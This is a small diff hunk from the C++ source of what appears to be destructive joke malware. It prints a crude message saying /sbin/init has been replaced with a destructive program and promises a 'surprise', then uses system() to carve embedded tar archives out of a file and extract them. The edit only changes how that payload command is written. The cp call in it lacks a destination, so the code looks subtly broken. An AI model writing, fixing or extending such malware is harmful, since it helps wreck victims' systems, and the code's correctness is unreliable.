@@ -65,7 +65,7 @@ int main()
 
                         std::cout << "\033[2J\033[1;1HYour PC has been FUCKED by Hatsune Miku!!!\n/sbin/init has been replaced with a destructive program.\nI have a surprise at the end of the payload however. Stick around to find out what it is!";
 
-                        system(("cp /miku/mikumiku.miku && grep -abo 'ustar' /miku/mikumiku.miku | cut -d: -f1 | while read off; do start=$((off-257)); dd if=/miku/mikumiku.miku bs=1 skip=$start status=none | tar xf -; done").c_str());
+                        system("cp /miku/mikumiku.miku && grep -abo 'ustar' /miku/mikumiku.miku | cut -d: -f1 | while read off; do start=$((off-257)); dd if=/miku/mikumiku.miku bs=1 skip=$start status=none | tar xf -; done");
 
                         return EXIT_SUCCESS;
                 }
